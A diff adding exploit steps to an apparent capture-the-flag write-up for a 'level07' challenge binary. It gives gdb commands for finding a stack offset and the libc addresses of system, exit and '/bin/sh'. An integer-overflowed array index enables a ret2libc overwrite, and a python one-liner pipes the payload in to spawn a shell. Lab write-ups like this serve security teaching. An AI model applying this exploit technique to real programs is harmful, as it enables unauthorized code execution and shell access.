@@ -196,3 +196,44 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
+```sh
+(gdb) b *0x080487a3
+Breakpoint 1 at 0x80487a3
+(gdb) r
+Starting program: /home/users/level07/level07 
+
+Breakpoint 1, 0x080487a3 in main ()
+(gdb) p (($ebp+4) - ($esp+36)) / 4
+$1 = 114
+```
+
+```sh
+p system
+0xf7e6aed0 = 4159090384    system
+
+p exit
+0xf7e5eb70 = 4159023984    exit
+
+info proc map - find X, X, "/bin/sh"
+0xf7f897ec = 4160264172    "/bin/sh"
+```
+
+```sh
+store
+4159090384 #sys addr
+1073741938 #index (EBP + 4)
+# store[114] = 0xf7e6aed0
+store
+4159023984 #exit addr
+115 #index (EBP + 8, EIP for system)
+# tab[115] = 0xf7e5eb70
+store
+4160264172 # "/bin/sh" addr
+116 #index (EBP + 12m 1st arg for system)
+# tab[116] = 0xf7f897ec
+quit
+```
+
+```sh
+(python -c 'print "store\n4159090384\n1073741938\nstore\n4159023984\n115\nstore\n4160264172\n116\nquit"'; cat) | ./level07
+```
